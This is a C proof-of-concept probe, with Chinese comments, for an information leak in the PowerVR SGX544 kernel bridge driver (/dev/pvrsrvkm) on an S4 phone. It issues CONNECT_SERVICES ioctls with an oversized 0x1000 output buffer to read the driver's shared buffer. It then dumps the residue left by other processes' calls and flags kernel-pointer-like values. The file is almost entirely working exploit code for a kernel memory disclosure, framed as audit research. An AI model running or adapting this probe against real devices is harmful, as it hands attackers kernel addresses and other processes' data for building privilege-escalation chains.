/*
 * pvr_probe.c —— PVR bridge 可达性与 out 缓冲泄漏实测（S4 / PowerVR SGX544）
 *
 * 审计发现的形态（bridged_pvr_bridge.c:4744）：
 *     CopyToUserWrapper(psPerProc, ui32BridgeID,
 *                       psBridgePackageKM->pvParamOut,
 *                       psBridgeOut,
 *                       psBridgePackageKM->ui32OutBufferSize)
 *   - psBridgeOut 是**全局共享**的 0x1000 缓冲（psEnvData->pvBridgeData，osfunc.c:642）
 *   - ui32OutBufferSize 完全由用户控制，只校验上限（>0x1000 才拒）
 *   - RELEASE 版 CopyToUserWrapper 直接 = OSCopyToUser(..., ui32Size)
 *   ⇒ 用户传 0x1000 就拿到整个 out 缓冲，不管 handler 实际写了多少
 *   ⇒ 残留内容来自**上一次任何进程**的 bridge 调用（SurfaceFlinger / gralloc）
 *
 * 本探针只做：
 *   1. open /dev/pvrsrvkm（验证 SELinux 是否放行 shell 域）
 *   2. CONNECT_SERVICES（正常 out=8 字节）拿 hKernelServices
 *   3. 再次 CONNECT_SERVICES，out 给 0x1000，统计非零字节并打印前 128 字节
 *   4. 若干次无害 bridge 调用，重复步骤 3，看残留是否含有指针样数据
 *
 * 不做任何写操作、不触发异常状态。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define PVR_IOC_GID	'g'

struct pvr_pkg {
	uint32_t ui32BridgeID;
	uint32_t ui32Size;
	void *pvParamIn;
	uint32_t ui32InBufferSize;
	void *pvParamOut;
	uint32_t ui32OutBufferSize;
	uint32_t hKernelServices;
};

#define PVR_IOWR(idx)	_IOWR(PVR_IOC_GID, idx, struct pvr_pkg)

/* PVRSRV_BRIDGE_CORE_CMD_FIRST = 0，CONNECT_SERVICES = FIRST+12 */
#define BRIDGE_CONNECT_SERVICES	PVR_IOWR(12)

struct in_connect {
	uint32_t ui32BridgeFlags;
	uint32_t ui32Flags;
};
struct out_connect {
	uint32_t eError;
	uint32_t hKernelServices;
};

static int pvr_call(int fd, uint32_t bridge_id, void *in, uint32_t in_sz,
		    void *out, uint32_t out_sz, uint32_t hks)
{
	struct pvr_pkg p;

	memset(&p, 0, sizeof p);
	p.ui32BridgeID = bridge_id;
	p.ui32Size = sizeof p;
	p.pvParamIn = in;
	p.ui32InBufferSize = in_sz;
	p.pvParamOut = out;
	p.ui32OutBufferSize = out_sz;
	p.hKernelServices = hks;
	return ioctl(fd, PVR_IOWR(12), &p);
}

/* 统计缓冲里的非零字节数与前 8 个 32 位字 */
static void dump_leak(const char *tag, const unsigned char *b, size_t n)
{
	size_t i, nz = 0, ptr_like = 0;
	int shown = 0;

	for (i = 0; i < n; i++)
		if (b[i])
			nz++;
	for (i = 0; i + 4 <= n; i += 4) {
		uint32_t v = *(const uint32_t *)(b + i);
		if (v >= 0xc0000000u && v < 0xf0000000u)
			ptr_like++;
	}
	printf("%s: 非零 %zu/%zu 字节，内核段指针样 32 位字 %zu 个\n",
	       tag, nz, n, ptr_like);
	/* 打印全部非零字（最多 120 个），标出连续零区 */
	for (i = 0; i + 4 <= n && shown < 120; i += 4) {
		uint32_t v = *(const uint32_t *)(b + i);

		if (!v)
			continue;
		printf("  +%04zx: %08x%s\n", i, v,
		       (v >= 0xc0000000u && v < 0xf0000000u) ? "  <PTR>" : "");
		shown++;
	}
	if (shown >= 120)
		printf("  ... (截断)\n");
}

int main(void)
{
	int fd;
	struct in_connect in;
	struct out_connect out;
	unsigned char big[0x1000];
	int ret;
	uint32_t hks = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== PVR probe ===\n");

	fd = open("/dev/pvrsrvkm", O_RDWR);
	if (fd < 0) {
		printf("[!] open: %s (errno=%d)\n", strerror(errno), errno);
		return 1;
	}
	printf("[0] open ok, fd=%d\n", fd);

	/* 1. CONNECT_SERVICES，正常尺寸 */
	memset(&in, 0, sizeof in);
	memset(&out, 0, sizeof out);
	errno = 0;
	ret = pvr_call(fd, BRIDGE_CONNECT_SERVICES, &in, sizeof in,
		       &out, sizeof out, 0);
	printf("[1] CONNECT(out=8) ret=%d errno=%d (%s) eError=%u hks=%#x\n",
	       ret, errno, ret ? strerror(errno) : "ok", out.eError,
	       out.hKernelServices);
	hks = out.hKernelServices;
	if (ret != 0) {
		printf("[!] CONNECT 失败，后续 bridge 需要 hKernelServices，停止\n");
		close(fd);
		return 2;
	}

	/* 2. 同一次调用，out 要 0x1000 —— 观察全局 out 缓冲残留 */
	memset(big, 0xcc, sizeof big);
	memset(&out, 0, sizeof out);
	errno = 0;
	ret = pvr_call(fd, BRIDGE_CONNECT_SERVICES, &in, sizeof in,
		       big, sizeof big, hks);
	printf("[2] CONNECT(out=0x1000) ret=%d errno=%d (%s)\n",
	       ret, errno, ret ? strerror(errno) : "ok");
	if (ret == 0)
		dump_leak("[2] leak", big, sizeof big);

	/* 3. 再打几次，看残留是否随调用变化（证明是共享缓冲而非清零） */
	{
		int k;

		for (k = 0; k < 3; k++) {
			char tag[32];

			memset(big, 0xcc, sizeof big);
			pvr_call(fd, BRIDGE_CONNECT_SERVICES, &in, sizeof in,
				 big, sizeof big, hks);
			snprintf(tag, sizeof tag, "[3.%d] leak", k);
			dump_leak(tag, big, 64);
		}
	}

	close(fd);
	printf("=== done ===\n");
	return 0;
}
